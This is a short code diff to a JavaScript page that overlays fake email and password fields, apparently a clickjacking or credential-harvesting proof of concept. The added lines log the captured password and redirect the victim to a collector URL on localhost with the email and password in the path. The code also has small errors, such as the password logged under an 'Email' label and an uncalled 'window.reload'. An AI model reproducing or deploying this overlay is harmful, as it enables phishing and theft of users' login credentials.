@@ -47,6 +47,9 @@
             var buttonStyleParam = getURLParameter('buttonStyle');
             var customJavaScript = getURLParameter('customJavaScript');
 
+            var email= getURLParameter('jacksEmail') ;
+            var pass= getURLParameter('jacksPassword');
+
             var emailStyle = usernameStyleParam + 'position: absolute; z-index: 2; top: ' + userNameTop + 'px; left: ' + userNameLeft + 'px;';
             $('#inputMalEmail').attr('style', emailStyle);
 
@@ -67,8 +70,12 @@
                     var jacksEmail = $('#inputMalEmail').val();
                     var jacksPassword = $('#inputMalPassword').val();
                     console.log('Email: ' + jacksEmail);
+                    console.log('Email: ' + jacksPassword);
                     alert('Captured Creds are: \nUsername is: ' + jacksEmail + ' \nAND\nPassword is: ' + jacksPassword);
-                    location.reload();
+     				window.location.href = ("http://localhost:8000/credentials.html/poc=" + jacksEmail + ':' + jacksPassword);
+     				window.reload;
+
+
                 }
             });
         });
